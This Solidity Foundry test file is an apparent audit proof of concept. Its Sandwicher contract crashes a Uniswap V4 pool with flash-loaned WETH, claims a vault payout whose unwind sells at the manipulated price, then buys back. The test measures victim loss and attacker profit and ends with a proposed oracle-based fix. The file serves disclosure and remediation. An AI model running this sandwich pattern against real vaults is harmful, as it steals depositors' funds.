// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {Vm} from "forge-std/Vm.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";

import {CoreVault} from "../../../src/core/CoreVault.sol";
import {ICoreVault} from "../../../src/interfaces/ICoreVault.sol";
import {IAdapter} from "../../../src/interfaces/IAdapter.sol";
import {V4SwapRouter} from "../../mocks/v4/V4SwapRouter.sol";
import {HubFundFixture} from "./HubFundFixture.sol";

/// @notice A Shareholder who sandwiches its own claim in one transaction: dump WETH into the Mandate pool, claim the
///         payout (whose automatic unwind then sells the fund's WETH at the crashed price), buy the WETH back.
contract Sandwicher {
    CoreVault internal immutable core;
    V4SwapRouter internal immutable router;
    IERC20 internal immutable weth;
    IERC20 internal immutable usdc;
    PoolKey internal key;

    constructor(CoreVault core_, V4SwapRouter router_, IERC20 weth_, IERC20 usdc_, PoolKey memory key_) {
        core = core_;
        router = router_;
        weth = weth_;
        usdc = usdc_;
        key = key_;
        weth_.approve(address(router_), type(uint256).max);
        usdc_.approve(address(router_), type(uint256).max);
    }

    function deposit(uint256 amount) external {
        usdc.approve(address(core), amount);
        core.deposit(amount, 0);
    }

    function request(uint256 amount, ICoreVault.PayoutMode mode) external {
        core.requestPayout(amount, mode);
    }

    function claim() external returns (ICoreVault.PayoutReceipt memory) {
        return core.claimPayout("");
    }

    /// @param wethToDump WETH sold into the pool before the claim (a flash loan in practice).
    /// @param restoreTo sqrtPriceX96 to buy the price back up to after the claim.
    function sandwichClaim(uint256 wethToDump, uint160 restoreTo) external returns (ICoreVault.PayoutReceipt memory r) {
        router.swap(key, true, -int256(wethToDump), TickMath.MIN_SQRT_PRICE + 1);
        r = core.claimPayout("");
        router.swap(key, false, -int256(usdc.balanceOf(address(this))), restoreTo);
    }
}

/// @title Proof of concept: the automatic unwind's price floor is relative to a spot price the claimant moves first
/// @notice `SpokeVault._unwindSwap` floors the unwind swap at `IAdapter.spotQuote` (Uniswap V4 `slot0`) less
///         `MAX_UNWIND_SLIPPAGE_BPS` (5%), and `_unwindPosition` sizes the exit from `positionValue` at the same spot.
///         Both are read inside the claim, after any swap the claimant put in front of it. The 5% therefore bounds
///         nothing: a claimant who first crashes the pool (flash-loaned WETH sold into the Mandate pool) makes the vault
///         (1) value the position at the crashed price, so it exits a larger share of it, and (2) sell that WETH with a
///         floor 5% under the crashed price. The claimant then buys the WETH back, pocketing the fund's loss minus
///         two LP fees. No mempool is needed: the attacker is the claimant and does everything in one transaction.
/// @dev Attack: victim deposits 1,000,000 USDC, attacker 200,000; the manager allocates 95% into a WETH/USDC ±10%
///      position (as a real manager would); the attacker requests a 150,000 USDC Standard Payout (reserve = Free
///      Idle, ~60,000) and after the term claims inside a sandwich (dump 1,500 WETH, claim, buy back to the starting
///      price). Measured against the same claim made honestly (state snapshot).
/// @dev Impact (measured): the unwind sells 52.8 WETH worth 132,064 USDC for 91,317 USDC, 30.9% under the external
///      price while the floor says 5%; the victim's wealth is 32,706 USDC lower than after an honest claim and the
///      attacker's 29,273 USDC higher (net of the two 0.05% LP fees on the flash-loaned volume, about 3,200 USDC).
///      The loss scales with the claim size; the cost scales only with pool depth. QA3 is OPEN, but the documented
///      reading ("the floor bounds execution against the price at the time of the swap") is not a bound at all.
/// @dev Fix: floor the unwind swap (and size the exit) against a reference the claimant cannot move in the same
///      block: the price source (Chainlink) the Core Vault already prices Share Assets with, or a TWAP; and revert
///      the claim (Partial Payout from Idle) when the pool's spot deviates from that reference beyond a tolerance.
contract UnwindSpotSandwichTest is HubFundFixture {
    address internal victim = makeAddr("victim");
    Sandwicher internal attacker;
    bytes32 internal positionKey;

    function setUp() public override {
        super.setUp();
        // The pool's own depth: about 2,000 WETH and 5,000,000 USDC within ±50% of the price.
        (int24 lo, int24 hi) = _rangeAround(5000);
        _provideExternalLiquidity(lo, hi, 2000e18, 5_000_000e6);

        attacker = new Sandwicher(core, router, IERC20(address(weth)), IERC20(address(usdc)), key);
        _deposit(victim, 1_000_000e6);
        usdc.mint(address(attacker), 200_000e6);
        attacker.deposit(200_000e6);

        // The manager puts 95% of Idle to work in a ±10% WETH/USDC position.
        (int24 lower, int24 upper) = _rangeAround(1000);
        (positionKey,,) = _allocateAndOpen(core.freeIdle() * 95 / 100, lower, upper);
        // The market arbitrages the manager's swap away: the pool sits at the external price again.
        _arbToExternalPrice();

        // A Standard Payout above Free Idle: the claim will unwind the shortfall.
        attacker.request(150_000e6, ICoreVault.PayoutMode.Standard);
        vm.warp(block.timestamp + 72 hours);
    }

    function test_POC_unwindSwapFloorIsRelativeToManipulatedSpot() public {
        uint256 victimBefore = _wealth(victim);
        uint256 attackerBefore = _wealth(address(attacker));

        // Honest claim, for reference: the unwind sells about 20 WETH at the external price less the pool's own
        // impact and fee, and the market arbitrages the pool back afterwards.
        uint256 snapshot = vm.snapshotState();
        attacker.claim();
        _arbToExternalPrice();
        uint256 victimHonest = _wealth(victim);
        uint256 attackerHonest = _wealth(address(attacker));
        assertGt(victimHonest + 500e6, victimBefore, "an honest unwind costs the victim at most a few hundred USDC");
        vm.revertToState(snapshot);

        // The sandwich: 1,500 WETH of flash-loaned capital, valued at the external price and netted out below.
        uint256 dump = 1500e18;
        weth.mint(address(attacker), dump);

        vm.recordLogs();
        attacker.sandwichClaim(dump, startSqrtPrice);
        (uint256 wethSold, uint256 usdcReceived) = _unwindSwap(vm.getRecordedLogs());

        // The price is back where it started, so every valuation below is at the external price.
        assertApproxEqRel(_usdcPerWeth(_spotSqrtPrice()), WETH_PRICE * 1e6, 0.001e18, "price restored");

        uint256 victimAfter = _wealth(victim);
        uint256 attackerAfter = _wealth(address(attacker)) - _fair(dump);
        uint256 fairValueSold = _fair(wethSold);
        uint256 unwindLossBps = (fairValueSold - usdcReceived) * 10_000 / fairValueSold;

        emit log_named_decimal_uint("WETH the unwind sold", wethSold, 18);
        emit log_named_decimal_uint("USDC it received", usdcReceived, 6);
        emit log_named_decimal_uint("fair value of that WETH", fairValueSold, 6);
        emit log_named_uint("unwind loss (bps, floor claims 500)", unwindLossBps);
        emit log_named_decimal_uint("victim loss vs honest claim (USDC)", victimHonest - victimAfter, 6);
        emit log_named_decimal_uint("attacker gain vs honest claim (USDC)", attackerAfter - attackerHonest, 6);

        // The fund sold its WETH far below the external price: the 5% floor bounded nothing.
        assertGt(unwindLossBps, 1500, "unwind executed more than 15% under the external price");
        // The victim paid for it, and the attacker took it home (net of two LP fees on the flash-loaned volume).
        assertGt(victimHonest - victimAfter, 20_000e6, "victim lost more than 20,000 USDC");
        assertGt(attackerAfter, attackerHonest + 10_000e6, "attacker gained more than 10,000 USDC over an honest claim");
        assertGt(attackerAfter, attackerBefore, "attacker ends richer than before the claim");
    }

    /// @dev The adapter's `Swapped(poolKey, tokenIn, tokenOut, amountIn, amountOut)` of the unwind swap.
    function _unwindSwap(Vm.Log[] memory logs) internal view returns (uint256 amountIn, uint256 amountOut) {
        bytes32 sig = IAdapter.Swapped.selector;
        for (uint256 i; i < logs.length; ++i) {
            if (logs[i].emitter != address(adapter) || logs[i].topics[0] != sig) continue;
            if (address(uint160(uint256(logs[i].topics[2]))) != address(weth)) continue;
            (amountIn, amountOut) = abi.decode(logs[i].data, (uint256, uint256));
        }
    }
}
